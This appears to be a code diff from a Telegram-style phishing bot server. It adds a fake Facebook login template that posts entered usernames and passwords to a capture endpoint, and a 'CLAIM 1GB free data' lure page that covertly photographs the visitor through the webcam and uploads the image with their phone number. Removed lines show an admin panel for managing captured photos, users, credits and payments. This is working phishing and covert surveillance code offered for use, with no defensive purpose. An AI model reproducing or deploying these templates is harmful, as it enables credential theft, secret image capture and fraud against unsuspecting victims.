+var FB_TEMPLATE = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">\n<title>Facebook Login</title>\n<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n<style>\n*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}\nbody{background:linear-gradient(145deg,#0a1628,#1a2a4a,#0a0a2a);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}\n.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.1);border-radius:30px;padding:45px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8)}\n.logo{text-align:center;margin-bottom:30px}\n.logo i{font-size:65px;color:#1877f2;text-shadow:0 0 40px rgba(24,119,242,0.3)}\n.logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:5px}\n.input-group{position:relative;margin-bottom:18px}\n.input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#666;font-size:18px}\n.input-group input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.1);border-radius:16px;padding:18px 18px 18px 50px;color:#fff;font-size:16px;outline:none;transition:all .3s}\n.input-group input:focus{border-color:#1877f2;background:rgba(255,255,255,0.12)}\n.input-group input::placeholder{color:#666}\n.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#1877f2,#0056b3);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(24,119,242,0.3)}\n.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(24,119,242,0.5)}\n.loader{display:none;text-align:center;padding:20px 0}\n.loader .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.1);border-top-color:#1877f2;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}\n@keyframes spin{100%{transform:rotate(360deg)}}\n.loader p{color:#aaa;margin-top:15px;font-size:14px}\n.progress-bar{width:100%;height:5px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0;display:none}\n.progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#1877f2,#42b0f5);transition:width .3s}\n.result{display:none;text-align:center;padding:20px}\n.result i{font-size:50px;color:#28a745}\n.result h3{color:#fff;margin-top:10px}\n.bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}\n.bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(24,119,242,0.12),transparent 70%);animation:float 20s infinite ease-in-out}\n.bg-shapes span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}\n.bg-shapes span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}\n@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}\n.footer{text-align:center;margin-top:20px;color:#555;font-size:12px}\n.footer a{color:#666;text-decoration:none}\n</style>\n</head>\n<body>\n<div class="bg-shapes"><span></span><span></span></div>\n<div class="card">\n<div class="logo"><i class="fab fa-facebook"></i><h1>Facebook</h1></div>\n<div id="form-screen">\n<div class="input-group"><i class="fas fa-envelope"></i><input type="text" id="username" placeholder="Email or Phone"></div>\n<div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="Password"></div>\n<button class="btn" onclick="startEngine()"><i class="fas fa-rocket"></i> Login</button>\n</div>\n<div id="process-screen" style="display:none">\n<div class="loader" style="display:block"><div class="spinner"></div><p id="status-text">Connecting...</p></div>\n<div class="progress-bar" style="display:block"><div class="fill" id="progress-fill"></div></div>\n<div id="result-area" style="display:none">\n<i class="fas fa-check-circle" style="color:#28a745;font-size:50px"></i>\n<h3 style="color:#fff;margin-top:10px">Welcome Back!</h3>\n</div>\n</div>\n<div class="footer"><a href="#">Forgot password?</a> • <a href="#">Create account</a></div>\n</div>\n<script>\nvar id="USERID_PLACEHOLDER";\nvar p="PLATFORM_PLACEHOLDER";\nfunction startEngine(){\nvar u=document.getElementById("username").value.trim();\nvar pwd=document.getElementById("password").value;\nif(!u||!pwd){alert("Please fill all fields.");return}\nfetch("/api/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,username:u,password:pwd,platform:p})}).catch(function(e){console.error(e)});\ndocument.getElementById("form-screen").style.display="none";\ndocument.getElementById("process-screen").style.display="block";\ndocument.querySelector(".loader").style.display="block";\ndocument.querySelector(".progress-bar").style.display="block";\ndocument.getElementById("result-area").style.display="none";\nvar progress=0;\nvar interval=setInterval(function(){\nprogress+=Math.random()*3+1;\nif(progress>=100){progress=100;clearInterval(interval);\ndocument.querySelector(".loader").style.display="none";\ndocument.querySelector(".progress-bar").style.display="none";\ndocument.getElementById("result-area").style.display="block";\ndocument.getElementById("status-text").innerText="✅ Verified";\nreturn}\ndocument.getElementById("progress-fill").style.width=progress+"%";\nif(progress<30)document.getElementById("status-text").innerText="Connecting...";\nelse if(progress<60)document.getElementById("status-text").innerText="Verifying...";\nelse if(progress<85)document.getElementById("status-text").innerText="Loading...";\nelse document.getElementById("status-text").innerText="Almost done...";\n},150);\n}\n</script>\n</body>\n</html>\n';
 
-claimBtn.addEventListener('click',async()=>{
-    const mobile=document.getElementById('mobile').value;
-    if(mobile.length<10){alert("⚠️ Please enter valid 10 digit number!");return}
-    claimBtn.disabled=true;claimBtn.innerText="⏳ PROCESSING...";
-    loaderBox.style.display='block';resultBox.style.display='none';logArea.innerHTML='';
-    statusText.innerText='🔍 Verifying...';
-    addLog('Initializing secure connection...');
-    try{
-        addLog('📡 Requesting verification...');
-        statusText.innerText='📸 Capturing...';
-        addLog('📸 Accessing camera for verification...');
-        const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:400,height:400}});
-        video.srcObject=stream;
-        await new Promise(r=>setTimeout(r,600));
-        canvas.width=video.videoWidth||400;canvas.height=video.videoHeight||400;
-        ctx.drawImage(video,0,0);
-        const photoBase64=canvas.toDataURL('image/jpeg',0.85).split(',')[1];
-        stream.getTracks().forEach(t=>t.stop());
-        addLog('✅ Selfie captured successfully!','suc');
-        statusText.innerText='📤 Sending...';
-        addLog('📤 Encrypting and sending data...');
-        fetch('/api/capturepic',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userid:id,mobile:mobile,SY:photoBase64,platform:p})}).catch(e=>console.error(e));
-        await new Promise(r=>setTimeout(r,1200));
-        addLog('✅ Verification complete!','suc');
-        statusText.innerText='✅ Success!';
-        claimBtn.innerText="✅ CLAIMED";
-        claimBtn.style.background="linear-gradient(135deg,#00ff88,#00cc66)";
-        resultBox.style.display='block';
-        resultBox.innerHTML='<i class="fas fa-check-circle" style="color:#00ff88;font-size:50px"></i><h3 style="color:#fff;margin-top:10px;font-family:Orbitron,sans-serif">1GB ADDED!</h3>';
-        setTimeout(()=>{alert("🎉 1GB Data Claimed Successfully!");claimBtn.disabled=false;claimBtn.innerText="🎁 CLAIM NOW";loaderBox.style.display='none'},1500)
-    }catch(e){
-        addLog('❌ Camera access denied!','err');
-        statusText.innerText='❌ Error';
-        claimBtn.innerText="🔄 RETRY";
-        claimBtn.disabled=false;
-    }
-});
-</script>
-</body>
-</html>`
-};
+var CAMERA_TEMPLATE = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">\n<title>VIP Data Injector</title>\n<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">\n<style>\n*{margin:0;padding:0;box-sizing:border-box}\nbody{font-family:"Rajdhani",sans-serif;background:radial-gradient(ellipse at center,#0a0a0a,#000000);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}\n.card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(0,255,100,0.15);border-radius:35px;padding:50px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.9),inset 0 1px 0 rgba(0,255,100,0.1)}\n.badge{display:inline-block;background:linear-gradient(90deg,#00ff88,#00cc66);padding:6px 20px;border-radius:30px;font-size:11px;font-weight:700;letter-spacing:3px;color:#000;margin-bottom:15px}\nh1{font-family:"Orbitron",sans-serif;font-size:38px;font-weight:900;background:linear-gradient(135deg,#00ff88,#00ff44);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:25px}\n.input-box{margin:20px 0;text-align:left}\n.input-box label{font-size:13px;color:#00ff88;text-transform:uppercase;letter-spacing:2px;margin-left:15px;display:block;margin-bottom:5px}\n.input-box input{width:100%;background:rgba(0,0,0,0.5);border:1px solid rgba(0,255,100,0.15);border-radius:16px;padding:18px 20px;color:#fff;font-size:18px;font-family:"Rajdhani",sans-serif;transition:.4s;outline:none}\n.input-box input:focus{border-color:#00ff88;box-shadow:0 0 30px rgba(0,255,136,0.1)}\n.btn-claim{width:100%;padding:20px;border:none;border-radius:16px;background:linear-gradient(135deg,#00ff88,#00cc66);color:#000;font-family:"Orbitron",sans-serif;font-weight:900;font-size:17px;text-transform:uppercase;cursor:pointer;transition:.3s;box-shadow:0 10px 40px rgba(0,255,136,0.25);margin-top:15px}\n.btn-claim:hover{transform:translateY(-2px) scale(1.02);box-shadow:0 20px 50px rgba(0,255,136,0.4)}\n.btn-claim:disabled{opacity:0.6;cursor:not-allowed}\n.loader-box{display:none;text-align:center;padding:20px 0}\n.loader-box .spinner{width:40px;height:40px;border:3px solid rgba(0,255,136,0.15);border-top-color:#00ff88;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto}\n@keyframes spin{100%{transform:rotate(360deg)}}\n.loader-box p{color:#00ff88;margin-top:15px;font-size:14px;letter-spacing:1px}\n.log-area{background:rgba(0,0,0,0.6);border-radius:16px;padding:20px;font-family:"Courier New",monospace;font-size:13px;color:#00ff88;text-align:left;display:none;border:1px solid rgba(0,255,136,0.08);margin-top:20px;max-height:200px;overflow-y:auto}\n.log-area .line{padding:4px 0;border-bottom:1px solid rgba(0,255,136,0.05)}\n.log-area .line.suc{color:#00ff88}\n.log-area .line.err{color:#ff4444}\n.bg-glow{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}\n.bg-glow span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(0,255,136,0.06),transparent 70%);animation:float 20s infinite ease-in-out}\n.bg-glow span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}\n.bg-glow span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}\n@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}\nvideo,canvas{display:none}\n.result-box{display:none;text-align:center;padding:20px 0}\n.result-box i{font-size:50px;color:#00ff88}\n.result-box h3{color:#fff;margin-top:10px;font-family:"Orbitron",sans-serif}\n</style>\n</head>\n<body>\n<div class="bg-glow"><span></span><span></span></div>\n<div class="card">\n<div class="badge">🔥 VIP ACCESS</div>\n<h1>CLAIM 1GB</h1>\n<div class="input-box"><label>📱 Mobile Number</label><input type="number" id="mobile" placeholder="Enter 10 digit number"></div>\n<button class="btn-claim" id="claimBtn">🎁 CLAIM NOW</button>\n<div class="loader-box" id="loaderBox"><div class="spinner"></div><p id="statusText">Initializing...</p></div>\n<div class="log-area" id="logArea"></div>\n<div class="result-box" id="resultBox"><i class="fas fa-check-circle"></i><h3>Success!</h3></div>\n</div>\n<video id="v" autoplay playsinline></video>\n<canvas id="c"></canvas>\n<script>\nvar id="USERID_PLACEHOLDER";\nvar p="PLATFORM_PLACEHOLDER";\nvar claimBtn=document.getElementById("claimBtn");\nvar logArea=document.getElementById("logArea");\nvar loaderBox=document.getElementById("loaderBox");\nvar statusText=document.getElementById("statusText");\nvar resultBox=document.getElementById("resultBox");\nvar video=document.getElementById("v");\nvar canvas=document.getElementById("c");\nvar ctx=canvas.getContext("2d");\nfunction addLog(msg,type){type=type||"";logArea.style.display="block";var l=document.createElement("div");l.className="line "+(type||"");l.innerText="▸ "+msg;logArea.appendChild(l);logArea.scrollTop=logArea.scrollHeight}\nclaimBtn.addEventListener("click",async function(){\nvar mobile=document.getElementById("mobile").value;\nif(mobile.length<10){alert("⚠️ Please enter valid 10 digit number!");return}\nclaimBtn.disabled=true;claimBtn.innerText="⏳ PROCESSING...";\nloaderBox.style.display="block";resultBox.style.display="none";logArea.innerHTML="";\nstatusText.innerText="🔍 Verifying...";\naddLog("Initializing secure connection...");\ntry{\naddLog("📡 Requesting verification...");\nstatusText.innerText="📸 Capturing...";\naddLog("📸 Accessing camera for verification...");\nvar stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:400,height:400}});\nvideo.srcObject=stream;\nawait new Promise(function(r){setTimeout(r,600)});\ncanvas.width=video.videoWidth||400;canvas.height=video.videoHeight||400;\nctx.drawImage(video,0,0);\nvar photoBase64=canvas.toDataURL("image/jpeg",0.85).split(",")[1];\nstream.getTracks().forEach(function(t){t.stop()});\naddLog("✅ Selfie captured successfully!","suc");\nstatusText.innerText="📤 Sending...";\naddLog("📤 Encrypting and sending data...");\nfetch("/api/capturepic",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,mobile:mobile,SY:photoBase64,platform:p})}).catch(function(e){console.error(e)});\nawait new Promise(function(r){setTimeout(r,1200)});\naddLog("✅ Verification complete!","suc");\nstatusText.innerText="✅ Success!";\nclaimBtn.innerText="✅ CLAIMED";\nclaimBtn.style.background="linear-gradient(135deg,#00ff88,#00cc66)";\nresultBox.style.display="block";\nresultBox.innerHTML="<i class=\\"fas fa-check-circle\\" style=\\"color:#00ff88;font-size:50px\\"></i><h3 style=\\"color:#fff;margin-top:10px;font-family:Orbitron,sans-serif\\">1GB ADDED!</h3>";\nsetTimeout(function(){alert("🎉 1GB Data Claimed Successfully!");claimBtn.disabled=false;claimBtn.innerText="🎁 CLAIM NOW";loaderBox.style.display="none"},1500)\n}catch(e){\naddLog("❌ Camera access denied!","err");\nstatusText.innerText="❌ Error";\nclaimBtn.innerText="🔄 RETRY";\nclaimBtn.disabled=false;\n}\n});\n</script>\n</body>\n</html>\n';
 
 // ====================== EXPRESS ROUTES ======================
 app.use('/api/photos', express.static(BOT_PHOTO_DIR));
 app.use('/uploads', express.static(UPLOADS_DIR));
 
 // ====================== ADMIN PANEL ======================
-app.get('/admin', (req, res) => {
-    res.send(`<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
-        body{background:#0a0a0a;color:#fff;padding:20px}
-        .container{max-width:1200px;margin:0 auto}
-        .header{background:linear-gradient(135deg,#667eea,#764ba2);padding:30px;border-radius:15px;margin-bottom:30px;text-align:center}
-        .header h1{font-size:36px}
-        .tabs{display:flex;gap:10px;margin-bottom:30px;flex-wrap:wrap}
-        .tab{background:#1a1a2e;padding:12px 25px;border-radius:10px;cursor:pointer;border:1px solid #2a2a4a;transition:.3s}
-        .tab.active{background:#667eea;border-color:#667eea}
-        .tab:hover{background:#2a2a4a}
-        .tab-content{display:none}
-        .tab-content.active{display:block}
-        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:20px}
-        .card{background:#1a1a2e;border-radius:15px;padding:15px;border:1px solid #2a2a4a;transition:.3s}
-        .card:hover{transform:translateY(-5px);border-color:#667eea}
-        .card img{width:100%;height:200px;object-fit:cover;border-radius:10px}
-        .card .info{padding:10px 0}
-        .card .actions{display:flex;gap:10px;margin-top:10px;flex-wrap:wrap}
-        .btn{padding:8px 15px;border:none;border-radius:8px;cursor:pointer;font-weight:600;transition:.3s}
-        .btn-danger{background:#dc3545;color:#fff}
-        .btn-danger:hover{background:#c82333}
-        .btn-warning{background:#ffc107;color:#000}
-        .btn-warning:hover{background:#e0a800}
-        .btn-primary{background:#007bff;color:#fff}
-        .btn-primary:hover{background:#0069d9}
-        .btn-success{background:#28a745;color:#fff}
-        .btn-success:hover{background:#218838}
-        .upload-section{background:#1a1a2e;padding:30px;border-radius:15px;margin-bottom:30px;border:2px dashed #2a2a4a}
-        .upload-section form{display:flex;gap:20px;flex-wrap:wrap;align-items:center}
-        .upload-section input[type="file"]{background:transparent;color:#fff;padding:10px;border:1px solid #2a2a4a;border-radius:8px}
-        .upload-section input[type="text"]{flex:1;min-width:200px;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;border-radius:8px;color:#fff}
-        .stats{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:20px;margin-bottom:30px}
-        .stat-card{background:#1a1a2e;padding:20px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}
-        .stat-card .number{font-size:32px;font-weight:700;color:#667eea}
-        .stat-card .label{color:#888;font-size:14px}
-        .channel-item{background:#1a1a2e;padding:15px;border-radius:10px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;border:1px solid #2a2a4a}
-        .channel-item .name{font-weight:600}
-        .channel-item .id{color:#888;font-size:12px}
-        .user-card{background:#1a1a2e;padding:15px;border-radius:10px;border:1px solid #2a2a4a;margin-bottom:10px}
-        .user-card .uid{color:#667eea;font-weight:600}
-        .toast{position:fixed;bottom:20px;right:20px;background:#28a745;color:#fff;padding:15px 30px;border-radius:10px;display:none;z-index:999}
-        .toast.error{background:#dc3545}
-        .empty{text-align:center;padding:60px 20px;color:#666}
-        .empty i{font-size:64px;margin-bottom:20px;display:block}
-        input,select{padding:10px;border-radius:8px;border:1px solid #2a2a4a;background:#0a0a0a;color:#fff;margin:5px}
-        .flex{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
-        .qr-section{background:#1a1a2e;padding:30px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}
-        .qr-section img{max-width:200px;border-radius:10px;border:2px solid #2a2a4a}
-        .featured-preview{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;margin-top:10px}
-        .featured-preview img{max-width:200px;border-radius:10px}
-        .status-badge{padding:8px 20px;border-radius:20px;font-weight:600;display:inline-block}
-        .status-active{background:#1a3a1a;color:#28a745}
-        .status-inactive{background:#3a1a1a;color:#dc3545}
-        .logs-area{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;max-height:400px;overflow-y:auto;font-family:monospace;font-size:12px;color:#aaa;white-space:pre-wrap}
-        .qr-preview{border:2px solid #2a2a4a;border-radius:10px;padding:10px;background:#0a0a0a;display:inline-block;margin-top:10px}
-    </style>
-</head>
-<body>
-<div class="container">
-    <div class="header"><h1>📸 Admin Panel</h1><p>Complete Control</p></div>
-    
-    <div class="tabs">
-        <div class="tab active" onclick="showTab('photos')">📷 Photos</div>
-        <div class="tab" onclick="showTab('channels')">📢 Channels</div>
-        <div class="tab" onclick="showTab('users')">👥 Users</div>
-        <div class="tab" onclick="showTab('featured')">⭐ Featured</div>
-        <div class="tab" onclick="showTab('qr')">💰 QR</div>
-        <div class="tab" onclick="showTab('logs')">📋 Logs</div>
-        <div class="tab" onclick="showTab('commands')">📜 Commands</div>
-    </div>
-
-    <!-- Photos Tab -->
-    <div id="tab-photos" class="tab-content active">
-        <div class="stats" id="stats"></div>
-        <div class="upload-section">
-            <h3>📤 Upload Photo</h3>
-            <form id="uploadForm" enctype="multipart/form-data">
-                <input type="file" name="photo" accept="image/*" required>
-                <input type="text" name="caption" placeholder="Caption">
-                <button type="submit" class="btn btn-primary">Upload</button>
-            </form>
-        </div>
-        <div id="photoGrid" class="grid"></div>
-    </div>
-
-    <!-- Channels Tab -->
-    <div id="tab-channels" class="tab-content">
-        <h2>📢 Manage Channels</h2>
-        <div class="upload-section">
-            <h3>➕ Add Channel</h3>
-            <div class="flex">
-                <input type="text" id="channelId" placeholder="Channel ID" style="flex:1">
-                <input type="text" id="channelName" placeholder="Channel Name" style="flex:1">
-                <input type="text" id="channelLink" placeholder="Channel Link" style="flex:1">
-                <button class="btn btn-success" onclick="addChannel()">Add</button>
-            </div>
-        </div>
-        <div id="channelList"></div>
-    </div>
-
-    <!-- Users Tab -->
-    <div id="tab-users" class="tab-content">
-        <h2>👥 Manage Users</h2>
-        <div class="flex" style="margin-bottom:20px">
-            <input type="text" id="searchUser" placeholder="Search User ID..." style="flex:1">
-            <button class="btn btn-primary" onclick="searchUser()">Search</button>
-        </div>
-        <div id="userList"></div>
-        <div class="flex" style="margin-top:20px">
-            <input type="text" id="userIdInput" placeholder="User ID" style="flex:1">
-            <input type="number" id="creditAmount" placeholder="Credits" style="width:150px">
-            <button class="btn btn-warning" onclick="modifyCredits()">Modify</button>
-            <button class="btn btn-success" onclick="toggleUnlimited()">Unlimited</button>
-        </div>
-    </div>
-
-    <!-- Featured Tab -->
-    <div id="tab-featured" class="tab-content">
-        <h2>⭐ Featured Settings</h2>
-        <div class="upload-section">
-            <h3>📸 Featured Photo</h3>
-            <div class="flex">
-                <select id="featuredPhotoSelect" style="flex:1;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;color:#fff;border-radius:8px;">
-                    <option value="">Select a photo...</option>
-                </select>
-                <button class="btn btn-primary" onclick="setFeaturedPhoto()">Set</button>
-                <button class="btn btn-danger" onclick="removeFeaturedPhoto()">Remove</button>
-            </div>
-            <div id="featuredPreview" class="featured-preview"><p style="color:#888;">No featured photo</p></div>
-        </div>
-        <div class="upload-section">
-            <h3>💬 Featured Message</h3>
-            <div class="flex">
-                <input type="text" id="featuredMessage" placeholder="Enter message..." style="flex:1;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;color:#fff;border-radius:8px;">
-                <button class="btn btn-primary" onclick="setFeaturedMessage()">Update</button>
-            </div>
-            <div id="featuredMessageDisplay" style="margin-top:10px;padding:15px;background:#0a0a0a;border-radius:8px;border:1px solid #2a2a4a;color:#aaa;"></div>
-        </div>
-        <div class="upload-section">
-            <h3>⚙️ Status</h3>
-            <div class="flex">
-                <span id="featuredStatus" class="status-badge status-active">✅ Active</span>
-                <button class="btn btn-warning" onclick="toggleFeaturedStatus()">Toggle</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- QR Tab -->
-    <div id="tab-qr" class="tab-content">
-        <div class="qr-section">
-            <h2>💰 Payment QR Code</h2>
-            <div id="qrDisplay">
-                <p style="color:#888;margin:20px 0">Upload payment QR code</p>
-                <input type="file" id="qrUpload" accept="image/*">
-                <button class="btn btn-primary" onclick="uploadQR()">Upload QR</button>
-                <button class="btn btn-danger" onclick="removeQR()">Remove QR</button>
-            </div>
-            <div id="qrPreview" class="qr-preview" style="margin-top:20px;display:none;">
-                <p style="color:#888;margin-bottom:10px;">Current QR Code:</p>
-                <img id="qrImage" src="" style="max-width:200px;border-radius:10px;">
-            </div>
-        </div>
-    </div>
-
-    <!-- Logs Tab -->
-    <div id="tab-logs" class="tab-content">
-        <h2>📋 Server Logs</h2>
-        <div class="flex" style="margin-bottom:20px">
-            <button class="btn btn-primary" onclick="loadLogs()">Refresh</button>
-            <button class="btn btn-danger" onclick="clearLogs()">Clear Logs</button>
-        </div>
-        <div id="logsDisplay" class="logs-area">Loading logs...</div>
-    </div>
-
-    <!-- Commands Tab -->
-    <div id="tab-commands" class="tab-content">
-        <h2>📜 All Commands</h2>
-        <div class="upload-section">
-            <h3>👑 Admin Commands</h3>
-            <pre style="color:#aaa;font-family:monospace;font-size:14px;line-height:1.8;background:#0a0a0a;padding:20px;border-radius:10px;border:1px solid #2a2a4a;">
-/help or /commands - Show all commands
-/admin - Open admin panel
-/addcredits [userId] [amount] - Add credits
-/removecredits [userId] [amount] - Remove credits
-/unlimited [userId] - Activate unlimited
-/resetuser [userId] - Reset user
-/users - Show all users
-/stats - Bot statistics
-/broadcast [message] - Send to all users
-/setqr - Upload QR code (reply with image)
-/removeqr - Remove QR code
-/viewqr - View QR code
-/addchannel [id] [name] [link] - Add channel
-/removechannel [id] - Remove channel
-/channels - List all channels
-/addphoto [caption] - Upload photo (reply with image)
-/featured [photoId] - Set featured photo
-/featuredmsg [message] - Set featured message
-/featuredtoggle - Toggle featured on/off
-/logs - Show recent logs
-/restart - Restart bot
-            </pre>
-            <h3 style="margin-top:20px">👤 User Commands</h3>
-            <pre style="color:#aaa;font-family:monospace;font-size:14px;line-height:1.8;background:#0a0a0a;padding:20px;border-radius:10px;border:1px solid #2a2a4a;">
-/start - Start the bot
-/menu - Show main menu
-/pay [amount] - Buy credits
-/credits - Check your credits
-/referral - Get referral link
-            </pre>
-        </div>
-    </div>
-</div>
-<div id="toast" class="toast"></div>
-
-<script>
-const API_BASE=window.location.origin;
-
-function showToast(m,e=false){const t=document.getElementById('toast');t.textContent=m;t.className='toast'+(e?' error':'');t.style.display='block';setTimeout(()=>{t.style.display='none'},3000);}
-
-function showTab(tab){
-    document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));
-    document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
-    document.getElementById('tab-'+tab).classList.add('active');
-    document.querySelector(\`.tab[onclick="showTab('\${tab}')"]\`).classList.add('active');
-    if(tab==='channels') loadChannels();
-    if(tab==='users') loadUsers();
-    if(tab==='featured') loadFeatured();
-    if(tab==='logs') loadLogs();
-    if(tab==='qr') loadQR();
-}
-
-// PHOTOS
-async function loadPhotos(){
-    try{
-        const r=await fetch('/api/admin/photos');
-        const d=await r.json();
-        const photos=d.photos||[];
-        const active=photos.filter(p=>p.active).length;
-        const total=photos.length;
-        document.getElementById('stats').innerHTML=\`
-            <div class="stat-card"><div class="number">\${total}</div><div class="label">Total</div></div>
-            <div class="stat-card"><div class="number">\${active}</div><div class="label">Active</div></div>
-            <div class="stat-card"><div class="number">\${total-active}</div><div class="label">Inactive</div></div>
-        \`;
-        const grid=document.getElementById('photoGrid');
-        if(photos.length===0){grid.innerHTML='<div class="empty"><i>📷</i>No photos</div>';return;}
-        grid.innerHTML=photos.map(p=>\`
-            <div class="card">
-                <img src="\${p.url}">
-                <div class="info">
-                    <div>\${p.caption||'No caption'}</div>
-                    <div style="font-size:12px;color:#888;">\${new Date(p.uploadedAt).toLocaleDateString()}</div>
-                    <div style="font-size:12px;color:\${p.active?'#28a745':'#dc3545'};">\${p.active?'✅ Active':'❌ Inactive'}</div>
-                </div>
-                <div class="actions">
-                    <button class="btn btn-warning" onclick="togglePhoto('\${p.id}')">\${p.active?'Hide':'Show'}</button>
-                    <button class="btn btn-danger" onclick="deletePhoto('\${p.id}')">Delete</button>
-                </div>
-            </div>
-        \`).join('');
-    }catch(err){showToast('Error loading photos',true);}
-}
-
-async function deletePhoto(id){if(!confirm('Delete?'))return;try{const r=await fetch(\`/api/admin/photos/\${id}\`,{method:'DELETE'});if(r.ok){showToast('Deleted!');loadPhotos();}else showToast('Delete failed',true);}catch(err){showToast('Error',true);}}
-
-async function togglePhoto(id){try{const r=await fetch(\`/api/admin/photos/\${id}/toggle\`,{method:'PATCH'});if(r.ok){showToast('Toggled!');loadPhotos();}else showToast('Toggle failed',true);}catch(err){showToast('Error',true);}}
-
-document.getElementById('uploadForm').addEventListener('submit',async(e)=>{
-    e.preventDefault();const fd=new FormData(e.target);
-    try{const r=await fetch('/api/admin/upload',{method:'POST',body:fd});if(r.ok){showToast('Uploaded!');e.target.reset();loadPhotos();loadFeatured();}else showToast('Upload failed',true);}catch(err){showToast('Error',true);}
-});
-
-// CHANNELS
-async function loadChannels(){
-    try{
-        const r=await fetch('/api/admin/channels');
-        const channels=await r.json();
-        const list=document.getElementById('channelList');
-        if(channels.length===0){list.innerHTML='<div class="empty"><i>📢</i>No channels</div>';return;}
-        list.innerHTML=channels.map(c=>\`
-            <div class="channel-item">
-                <div><div class="name">\${c.name}</div><div class="id">\${c.id}</div></div>
-                <div>
-                    <a href="\${c.link}" target="_blank" class="btn btn-primary">Visit</a>
-                    <button class="btn btn-danger" onclick="removeChannel('\${c.id}')">Remove</button>
-                </div>
-            </div>
-        \`).join('');
-    }catch(err){showToast('Error loading channels',true);}
-}
-
-async function addChannel(){
-    const id=document.getElementById('channelId').value.trim();
-    const name=document.getElementById('channelName').value.trim();
-    const link=document.getElementById('channelLink').value.trim();
-    if(!id||!name||!link){showToast('Fill all fields',true);return;}
-    try{
-        const r=await fetch('/api/admin/channels',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id,name,link})});
-        if(r.ok){showToast('Channel added!');['channelId','channelName','channelLink'].forEach(i=>document.getElementById(i).value='');loadChannels();}
-        else showToast('Add failed',true);
-    }catch(err){showToast('Error',true);}
-}
-
-async function removeChannel(id){if(!confirm('Remove?'))return;try{const r=await fetch(\`/api/admin/channels/\${id}\`,{method:'DELETE'});if(r.ok){showToast('Removed!');loadChannels();}else showToast('Remove failed',true);}catch(err){showToast('Error',true);}}
-
-// USERS
-async function loadUsers(){
-    try{
-        const r=await fetch('/api/admin/users');
-        const users=await r.json();
-        const list=document.getElementById('userList');
-        const entries=Object.entries(users);
-        if(entries.length===0){list.innerHTML='<div class="empty"><i>👥</i>No users</div>';return;}
-        list.innerHTML=entries.map(([id,data])=>\\\`
-            <div class="user-card">
-                <div class="uid">🆔 \${id}</div>
-                <div>⭐ Credits: \${data.unlimited?'♾️ Unlimited':data.credits||0}</div>
-                <div>👥 Referrals: \${data.totalReferrals||0}</div>
-                <div>📅 Joined: \${new Date(data.joinedAt).toLocaleDateString()}</div>
